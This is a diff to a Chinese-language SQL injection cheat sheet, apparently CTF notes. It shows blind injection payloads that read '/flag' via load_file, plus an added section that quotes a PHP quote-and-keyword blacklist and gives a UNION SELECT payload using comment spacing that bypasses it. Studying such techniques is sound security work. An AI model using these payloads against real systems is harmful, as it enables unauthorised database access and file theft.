@@ -12,6 +12,27 @@ admin' union select 1 where if(load_file('/flag') is not null,1,0)#
 'union select 1 where if(mid((select load_file('/flag')),2,1) in ('2'),1,0)#"
 ```
 
+## 绕过技巧
+
+对于这个检查
+```php
+function is_trying_to_hak_me($str)
+{   
+    $blacklist = ["' ", " '", '"', "`", " `", "` ", ">", "<"];
+    if (strpos($str, "'") !== false) {
+        if (!preg_match("/[0-9a-zA-Z]'[0-9a-zA-Z]/", $str)) {
+            return true;
+        }
+    }
+    foreach ($blacklist as $token) {
+        if (strpos($str, $token) !== false) return true;
+    }
+    return false;
+}
+```
+
+使用 `user=admin'1'/**/UNION/**/ALL/**/SELECT/**/1,2` 可以绕过
+
 ## sqlmap 常用
 
 ```sh
